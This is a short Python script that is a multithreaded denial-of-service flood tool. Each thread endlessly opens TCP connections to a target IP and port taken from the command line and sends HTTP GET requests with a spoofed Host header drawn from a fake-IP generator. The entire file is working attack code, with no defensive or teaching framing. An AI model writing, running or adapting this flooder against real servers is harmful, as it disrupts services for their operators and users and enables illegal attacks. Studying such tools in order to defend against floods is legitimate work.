import socket
import threading
from handler import args_handler
from ipgen import fake_ip_gen

        
def attack(target, dport):
    try:
        while True:
            fake_ip = fake_ip_gen()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, dport))
            s.send(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'))
            s.send(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'))
            s.close()
    except Exception as e:
        print(f"An error occurred: {str(e)}")

 
def main():
    target_ip, dport, num_threads = args_handler() 

    for _ in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, dport))
        thread.start()

  
if __name__ == '__main__':
    main()
 